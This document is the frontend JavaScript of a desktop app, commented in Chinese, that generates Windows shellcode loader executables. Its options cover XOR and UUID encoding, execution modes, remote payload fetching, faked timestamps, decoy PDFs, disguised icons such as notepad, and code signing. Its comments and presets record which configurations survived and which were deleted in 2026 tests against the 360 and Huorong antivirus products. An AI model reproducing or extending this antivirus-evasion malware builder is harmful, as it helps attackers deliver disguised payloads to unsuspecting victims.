const { invoke } = window.__TAURI__.core;

const $ = (id) => document.getElementById(id);
const logEl = $("log");

/* ---------- 日志着色 ---------- */
const esc = (s) =>
  s.replace(/[&<>]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));

function paint(text) {
  return esc(text)
    .split("\n")
    .map((line) => {
      let cls = "";
      if (/\[(ERROR|FATAL)\]/.test(line)) cls = "lv-err";
      else if (/失败|无法|警告|已跳过|不像载荷|不一致/.test(line)) cls = "lv-warn";
      else if (/^\[(\d+|R|E\d|T6)\]|^\[2b\]|^\[4b\]|^\[4c\]|^\[keep\]/.test(line)) cls = "lv-step";
      else if (/已生成|已同步|已还原|已屏蔽|下载完成|OK ->|时间戳 ->|已签名/.test(line)) cls = "lv-ok";
      else if (/^===/.test(line)) cls = "lv-dim";
      return cls ? `<span class="${cls}">${line}</span>` : line;
    })
    .join("\n");
}

function setLog(text) {
  logEl.innerHTML = paint(text);
  logEl.scrollTop = logEl.scrollHeight;
}
function appendLog(text) {
  logEl.innerHTML += "\n" + paint(text);
  logEl.scrollTop = logEl.scrollHeight;
}

$("clearLogBtn").addEventListener("click", () => setLog("日志已清空。"));

/* 右侧日志抽屉 展开/收起
 * 状态放在 body.log-open 上: 网格靠它把 3 列收成 2 列, 抽屉靠它滑出。
 * 一开一合两处入口（顶栏 ☰ 与 抽屉内「收起」）共用同一个 setLogOpen。 */
function setLogOpen(open) {
  const wasOpen = document.body.classList.contains("log-open");
  document.body.classList.toggle("log-open", open);
  $("drawerBtn").classList.toggle("is-open", open);   // 图标改由 CSS 切换
  $("drawerBtn").title = open ? "收起日志" : "编译日志";
  if (open && !wasOpen) logEl.scrollTop = logEl.scrollHeight;
}
$("drawerBtn").addEventListener("click", () =>
  setLogOpen(!document.body.classList.contains("log-open")));
$("toggleLogBtn").addEventListener("click", () => setLogOpen(false));

/* ---------- 环境自检 ---------- */
const ENV_DEPS = [
  ["x64", (e) => e.x64],
  ["x86", (e) => e.x86],
  ["windres", (e) => e.windres],
  ["openssl", (e) => e.openssl],
  ["osslsigncode", (e) => e.osslsigncode],
];

async function checkEnv() {
  try {
    const e = await invoke("check_env");
    $("envText").innerHTML = ENV_DEPS.map(([name, get]) => {
      const p = get(e) || "";
      const ok = p && !p.includes("未找到");
      return `<span class="dep ${ok ? "ok" : "miss"}" title="${esc(p)}">${name}</span>`;
    }).join("");
    const dot = document.querySelector(".dot");
    const ccOk = !e.x64.includes("未找到") || !e.x86.includes("未找到");
    if (!ccOk) dot.className = "dot bad";
    else if (ENV_DEPS.some(([, get]) => get(e).includes("未找到"))) dot.className = "dot warn";
    else dot.className = "dot ok";
  } catch (err) {
    $("envText").textContent = "环境检测失败";
  }
}

/* ---------- 文件/目录选择 ---------- */
document.querySelectorAll("[data-pick]").forEach((btn) => {
  btn.addEventListener("click", async () => {
    const kind = btn.dataset.pick;
    const target = btn.dataset.target;
    const p = await invoke("pick_file", { kind });
    if (!p) return;
    if (kind === "dir") {
      $(target).value = p;
      if (target === "listDir") refreshList();
    } else {
      $(target).value = p;
      if (target === "iconPath") setIcon(p, false);
      if (target === "decoyPath") setIcon("lib:pdf", true); // 诱饵是 PDF 时自动切 PDF 图标
      if (target === "payload" && ($("outDir").value === "" || $("outName").value === "loader.exe")) {
        const dir = p.substring(0, p.lastIndexOf("/"));
        if ($("outDir").value === "") $("outDir").value = dir;
      }
    }
  });
});

/* ---------- 解析 XOR 密钥 ---------- */
function parseKey(v) {
  v = (v || "").trim();
  if (!v) return null;
  const n = v.toLowerCase().startsWith("0x") ? parseInt(v, 16) : parseInt(v, 10);
  return Number.isFinite(n) ? n & 0xff : null;
}

/* ---------- 条件显示 ---------- */
$("loadMode").addEventListener("change", () => {
  $("urlRow").classList.toggle("hidden", $("loadMode").value !== "remote");
});
$("timeMode").addEventListener("change", () => {
  $("timeRow").classList.toggle("hidden", $("timeMode").value !== "custom");
});

/* 免杀增强项实测会被 360 查杀, 已从界面移除; 这里固定为空 */
const hardenList = () => [];

/* ---------- 实测预设 ---------- */
/* 2026-10-12 在 360 QVM + 火绒上实测(未签名)幸存的组合。
 * 注意: 360 查杀会直接删除文件, 所以"目录里消失的变体"= 被 360 杀了。 */
/* 2026-10-12 实测确认通过 360 QVM + 火绒(未签名)的 4 组配置。
 * 其余变体经历了两轮目录快照: 第一轮 6 个幸存、第二轮 4 个,
 * anti_strict / no_icon 未进入最终确认清单, 故不列为预设。 */
const PRESETS = {
  std:       { encoding: "chunk", mode: "direct", protect: "rx",   obf: true, icon: "lib:notepad", res: true, anti: false },
  b32:       { encoding: "b32",   mode: "direct", protect: "rx",   obf: true, icon: "lib:notepad", res: true, anti: false },
  prot_auto: { encoding: "chunk", mode: "direct", protect: "auto", obf: true, icon: "lib:notepad", res: true, anti: false },
  prot_rwx:  { encoding: "chunk", mode: "direct", protect: "rwx",  obf: true, icon: "lib:notepad", res: true, anti: false },
};

function applyPreset(k) {
  const p = PRESETS[k];
  if (!p) return;
  $("encoding").value = p.encoding;
  $("mode").value = p.mode;
  $("protect").value = p.protect;
  $("h_obf").checked = p.obf;
  $("h_res").checked = p.res;
  $("h_anti").checked = p.anti;
  pickedIcon = p.icon;
  $("iconPath").value = "";
  syncIconUI();
  syncEncWarn();
  syncModeWarn();
  // 程序设值不触发 change 事件, 需手动刷新底部摘要
  if (typeof syncSummary === "function") syncSummary();
}

/* 2026-10-12 实测被 360 查杀的形态: 给出可见警告, 但不禁止选择
 * (判定依据: 360 查杀会直接删除文件, 目录里消失的变体即被杀) */
const KILLED_ENC = ["b64", "uuid", "chunk_r", "raw", "auto"];
const KILLED_MODE = ["fiber", "callback"];

function syncEncWarn() {
  const w = $("encWarn");
  if (w) w.classList.toggle("hidden", !KILLED_ENC.includes($("encoding").value));
}
function syncModeWarn() {
  const w = $("modeWarn");
  if (w) w.classList.toggle("hidden", !KILLED_MODE.includes($("mode").value));
}

$("preset").addEventListener("change", () => applyPreset($("preset").value));
$("encoding").addEventListener("change", syncEncWarn);
$("mode").addEventListener("change", syncModeWarn);

/* ---------- 底部配置摘要 ---------- */
/* 常驻显示当前关键配置, 免得为确认一项而去翻卡片。
 * 被 360 杀过的选项标成橙色, 与卡片内的警告呼应。 */
const SUMMARY_FIELDS = [
  ["编码",   () => $("encoding").value,  (v) => KILLED_ENC.includes(v)],
  ["执行",   () => $("mode").value,      (v) => KILLED_MODE.includes(v)],
  ["保护",   () => $("protect").value.toUpperCase(), () => false],
  ["资源",   () => ($("h_res").checked ? "开" : "关"), (v) => v === "关"],
  ["签名",   () => ($("h_sign").checked ? "开" : "关"), () => false],
];

function syncSummary() {
  const el = $("summary");
  if (!el) return;
  el.innerHTML = SUMMARY_FIELDS.map(([label, get, bad]) => {
    const v = get();
    return `<span class="pill${bad(v) ? " warnp" : ""}">${label} <b>${esc(String(v))}</b></span>`;
  }).join("");
}

["encoding", "mode", "protect", "h_res", "h_sign"].forEach((id) => {
  const n = $(id);
  if (n) n.addEventListener("change", syncSummary);
});
syncSummary();

/* ---------- 图标选择 ---------- */
let pickedIcon = "lib:notepad";      // 默认与实测通过的那组一致

function syncIconUI() {
  document.querySelectorAll(".iconitem").forEach((el) => {
    el.classList.toggle("active", el.dataset.icon === pickedIcon);
  });
}

function setIcon(v, clearPath) {
  pickedIcon = v;
  if (clearPath) $("iconPath").value = "";
  syncIconUI();
}

async function buildIconGrid() {
  const grid = $("iconGrid");
  let names = [];
  try {
    names = await invoke("list_icons");
  } catch (_) {}
  for (const n of names) {
    const b = document.createElement("button");
    b.className = "iconitem";
    b.dataset.icon = "lib:" + n;
    b.title = n;
    b.innerHTML = `<img src="icons/${n}.png" alt="${n}" />`;
    b.addEventListener("click", () => setIcon("lib:" + n, true));
    grid.appendChild(b);
  }
  grid.querySelector('[data-icon=""]').addEventListener("click", () => setIcon("", true));
  $("iconPath").addEventListener("input", () => {
    const v = $("iconPath").value.trim();
    if (v) setIcon(v, false);
    else setIcon("", false);
  });
  syncIconUI();
}
buildIconGrid();
syncEncWarn();   // 初始化编码形态警告的显隐
syncModeWarn();  // 初始化执行方式警告的显隐

/* ---------- 生成 ---------- */
$("genBtn").addEventListener("click", async () => {
  const payload = $("payload").value.trim();
  if (!payload) {
    setLog("[ERROR] 请先选择 payload 文件");
    return;
  }
  if ($("loadMode").value === "remote" && !$("remoteUrl").value.trim()) {
    setLog("[ERROR] 远程模式必须填写载荷 URL");
    return;
  }
  if ($("timeMode").value === "custom" && !$("timeValue").value) {
    setLog("[ERROR] 请填写要伪造的时间");
    return;
  }
  const btn = $("genBtn");
  btn.disabled = true;
  btn.textContent = "编译中…";
  $("result").className = "result hidden";
  setLog("正在生成…");

  const opts = {
    payload,
    out_dir: $("outDir").value.trim(),
    out_name: $("outName").value.trim(),
    arch: $("arch").value,
    encoding: $("encoding").value,
    mode: $("mode").value,
    console: $("console").value === "console",
    xor_key: parseKey($("xorKey").value),
    load_mode: $("loadMode").value,
    remote_url: $("remoteUrl").value.trim(),
    time_mode: $("timeMode").value,
    time_value: $("timeValue").value,
    harden: hardenList(),
    stomp_dll: "",
    anti_strict: !!$("h_anti") && $("h_anti").checked,
    res_full: $("h_res").checked,
    decoy: $("decoyPath").value.trim(),
    sign: $("h_sign").checked,
    tsa_url: $("tsaUrl").value.trim(),
    protect: $("protect").value,
    obfuscate: $("h_obf").checked,
    show_errors: $("h_msg").checked,
    icon: pickedIcon,
  };

  try {
    const r = await invoke("generate", { opts });
    setLog(r.log);
    const res = $("result");
    if (r.ok) {
      res.className = "result ok";
      let extra = "";
      if (r.payload_file) extra += ` ｜ 待上传载荷: ${r.payload_file.split("/").pop()}`;
      if (r.time_ts) extra += " ｜ 时间戳已改写";
      res.textContent = `✔ 生成成功: ${r.output.split("/").pop()}  (${r.size} bytes, key=0x${r.key
        .toString(16)
        .padStart(2, "0")}${r.uuid_count ? ", UUID×" + r.uuid_count : ""})${extra}`;
      $("listDir").value = r.output.substring(0, r.output.lastIndexOf("/"));
      refreshList();
    } else {
      res.className = "result bad";
      res.textContent = "✘ 生成失败，详见日志";
    }
    res.classList.remove("hidden");
    // 结果提示在日志抽屉内 —— 若抽屉是收起的, 用户看不到结果, 故自动展开
    setLogOpen(true);
  } catch (err) {
    setLog("[ERROR] " + err);
  } finally {
    btn.disabled = false;
    btn.textContent = "生成 exe";
  }
});

/* ---------- 产物列表 ---------- */
async function refreshList() {
  const dir = $("listDir").value.trim();
  if (!dir) return;
  const rows = await invoke("list_dir", { dir });
  const tb = document.querySelector("#histTable tbody");
  tb.innerHTML = "";
  if (!rows.length) {
    tb.innerHTML = '<tr><td colspan="4" class="empty">该目录下没有 exe</td></tr>';
    return;
  }
  for (const f of rows) {
    const tr = document.createElement("tr");
    const t = f.mtime ? new Date(f.mtime * 1000).toLocaleString("zh-CN") : "-";
    tr.innerHTML = `<td class="name">${f.name}</td><td>${fmtSize(f.size)}</td><td>${t}</td>
      <td class="act"><button class="ghost">在 Finder 中显示</button></td>`;
    tr.querySelector("button").addEventListener("click", () => invoke("reveal", { path: f.path }));
    tb.appendChild(tr);
  }
}
const fmtSize = (n) => (n < 1024 ? n + " B" : (n / 1024).toFixed(1) + " KB");

$("refreshBtn").addEventListener("click", refreshList);
$("listDir").addEventListener("keydown", (e) => {
  if (e.key === "Enter") refreshList();
});

checkEnv();
refreshList();
